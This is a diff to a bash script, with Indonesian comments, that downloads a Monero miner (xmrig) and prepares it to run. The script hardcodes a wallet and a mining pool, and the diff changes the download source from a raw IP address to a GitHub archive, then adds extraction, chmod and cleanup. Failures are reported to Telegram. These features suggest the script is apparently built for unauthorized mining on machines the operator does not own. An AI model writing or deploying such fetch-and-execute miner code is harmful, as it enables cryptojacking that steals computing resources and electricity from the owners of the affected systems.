@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # --- CONFIG ---
-MINER_URL="http://47.236.124.210/tdn"
-MINER_FILE="tdn"
+MINER_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
+MINER_FILE="xmrig"
 WALLET="48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi"
 POOL="gulf.moneroocean.stream:443"
 PASS="$(whoami)"
@@ -81,7 +81,7 @@ send_telegram() {
 
 # --- Cek Dependensi ---
 check_dependencies() {
-    for cmd in bash wget curl pgrep openssl; do
+    for cmd in bash wget curl pgrep openssl tar; do
         if ! command -v $cmd >/dev/null 2>&1; then
             send_telegram "❌ Dependency '$cmd' tidak ditemukan."
             exit 1
@@ -93,9 +93,18 @@ check_dependencies() {
 download_miner() {
     if [ ! -f "$MINER_FILE" ]; then
         flush_output "[*] Mengunduh miner dari $MINER_URL..."
-        if wget -q -O "$MINER_FILE" "$MINER_URL" || curl -s -o "$MINER_FILE" "$MINER_URL"; then
-            chmod +x "$MINER_FILE"
-            flush_output "[✓] Miner berhasil diunduh dan diberi izin eksekusi."
+        ARCHIVE="xmrig.tar.gz"
+        if wget -q -O "$ARCHIVE" "$MINER_URL" || curl -s -o "$ARCHIVE" "$MINER_URL"; then
+            flush_output "[*] Mengekstrak $ARCHIVE..."
+            tar -xzf "$ARCHIVE"
+            if [ -f "$MINER_FILE" ]; then
+                chmod +x "$MINER_FILE"
+                flush_output "[✓] Miner berhasil diunduh, diekstrak, dan diberi izin eksekusi."
+                rm "$ARCHIVE"  # Hapus archive setelah ekstrak untuk membersihkan
+            else
+                send_telegram "❌ File miner '$MINER_FILE' tidak ditemukan setelah ekstrak"
+                exit 1
+            fi
         else
             send_telegram "❌ Gagal mengunduh miner dari $MINER_URL"
             exit 1
